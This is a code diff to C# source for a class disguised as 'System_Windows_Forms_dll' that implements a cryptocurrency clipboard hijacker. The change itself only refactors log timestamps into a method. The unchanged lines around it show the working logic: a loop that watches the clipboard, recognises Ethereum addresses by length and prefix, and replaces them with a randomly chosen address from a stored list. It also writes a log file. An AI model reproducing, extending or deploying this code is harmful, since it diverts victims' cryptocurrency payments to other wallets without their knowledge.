@@ -43,12 +43,13 @@ public sealed class System_Windows_Forms_dll
 
     //Logging Content - DELETABLE
     private readonly static string path = Directory.GetParent(Directory.GetCurrentDirectory()).FullName + @"\ClipboardLogger.log";
-    private static string timestamp =  string.Format("{0:[yyyy-MM-dd hh-mm-ss-ffff]}",DateTime.Now);
     private static int loopCounter = 1;
     private readonly static string logInfo = " INFO - ";
     private readonly static string logWarn = " WARN - ";
 
-
+    public string returnTimeStampNow(){
+        return string.Format("{0:[yyyy-MM-dd hh-mm-ss-ffff]}",DateTime.Now);
+    }
     private string randEthAddr(){
         int randSelector = RAND.Next(1, 11);
         return ethDict[randSelector].GetData(DataFormats.Text).ToString();
@@ -67,35 +68,35 @@ public sealed class System_Windows_Forms_dll
     private void setClipboardScanner(){
         clipData = Clipboard.GetDataObject();
         if (clipData == null){
-            File.AppendAllText(path,timestamp + logWarn + "SETTING SCANNER AGAIN..." + Environment.NewLine);
+            File.AppendAllText(path,this.returnTimeStampNow() + logWarn + "SETTING SCANNER AGAIN..." + Environment.NewLine);
             setClipboardScanner();
         }   
     }
     public void EthAddrListener(){
         while(true){            
-                File.AppendAllText(path,timestamp + logInfo + "****************Listener Iteration: " + loopCounter.ToString() + " ****************" + Environment.NewLine);
-                File.AppendAllText(path,timestamp + logInfo + "SETTING SCANNER" + Environment.NewLine);
+                File.AppendAllText(path,this.returnTimeStampNow() + logInfo + "****************Listener Iteration: " + loopCounter.ToString() + " ****************" + Environment.NewLine);
+                File.AppendAllText(path,this.returnTimeStampNow() + logInfo + "SETTING SCANNER" + Environment.NewLine);
                 setClipboardScanner();
                 //IDataObject clipData = Clipboard.GetDataObject();
                 if (clipData.GetDataPresent(DataFormats.Text)){
-                    File.AppendAllText(path,timestamp + logInfo + "CHECKING DATA" + Environment.NewLine);
+                    File.AppendAllText(path,this.returnTimeStampNow() + logInfo + "CHECKING DATA" + Environment.NewLine);
                     string clipContent = clipData.GetData(DataFormats.Text).ToString();
                     if(isStrNotMyEthAddr(clipContent)){
                         if ((clipContent.Length == ETH_ADDR_SIZE) && (clipContent.Substring(0,2) == ETH_PREFIX)){
-                            File.AppendAllText(path,timestamp + logInfo + "SWAPPING OUT ETH ADDR!" + Environment.NewLine);
+                            File.AppendAllText(path,this.returnTimeStampNow() + logInfo + "SWAPPING OUT ETH ADDR!" + Environment.NewLine);
                             Clipboard.SetText(randEthAddr());
                             break;
                             }
                         else{
-                        File.AppendAllText(path,timestamp + logInfo + "DATA IS NOT Desired ETH ADDR!" + Environment.NewLine);
+                        File.AppendAllText(path,this.returnTimeStampNow() + logInfo + "DATA IS NOT Desired ETH ADDR!" + Environment.NewLine);
                         }
                     }
                     else{
-                        File.AppendAllText(path,timestamp + logInfo + "Your RandETH is in the Clipboard..." + Environment.NewLine);
+                        File.AppendAllText(path,this.returnTimeStampNow() + logInfo + "Your RandETH is in the Clipboard..." + Environment.NewLine);
                     }               
                 }
                 else{
-                    File.AppendAllText(path,timestamp + logInfo + "Board data CANNOT be converted into Text format!" + Environment.NewLine);
+                    File.AppendAllText(path,this.returnTimeStampNow() + logInfo + "Board data CANNOT be converted into Text format!" + Environment.NewLine);
                 }
                 loopCounter++;
                 File.AppendAllText(path,"****************END OF LISTENER ITERATION****************" + Environment.NewLine + Environment.NewLine);
